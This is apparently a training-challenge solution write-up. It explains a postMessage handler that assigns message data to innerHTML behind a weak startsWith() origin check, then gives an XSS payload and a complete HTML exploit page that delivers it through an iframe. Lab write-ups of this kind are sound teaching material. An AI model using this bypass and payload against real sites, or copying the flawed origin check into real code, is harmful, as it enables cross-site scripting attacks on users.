# Challenge 3
Solution and further references for *challenge 3*.

<details>
 <summary>Spoiler: Solution for challenge 3</summary>

**Background**
The vulnerable embedded postMessage handler is implemented as follows:
```javascript
 window.addEventListener("message", (event) => {
  if (!event.origin.startsWith(window.origin)) return;
  currTime.innerHTML = event.data;
}, false);
```
So, on the one hand, there is an unsafe assignment of any `event.data` received to `currTime.innerHTML`. But on the other hand, there is an origin check in place:
```javascript
if (!event.origin.startsWith(window.origin)) return;
```
Strikingly, as the comparison uses `.startsWith()`, any attacker hosted domain that starts with the benign domain name can be used to bypass this restriction. An example for such a case is `victim.local.attacker.com`, whereas `attacker.com` is controlled by an attacker.

**Payload**:
The actual payload that is send via a *postMessage* is given in the following:
```html
<img src=x onerror=alert(document.domain)>
```

**Exploit**:
```html
<!DOCTYPE html>
<html lang="en">
  <body>
    <iframe src="challenge3_frame.php" id="victimFrame"></iframe>
    <script>
      setTimeout(function(){document.getElementById("victimFrame").contentWindow.postMessage("<img src=x onerror=alert(document.domain)>", "*")}, 3000);
    </script>
  </body>
</html>
```
</details>

## References
Additional information:
* https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage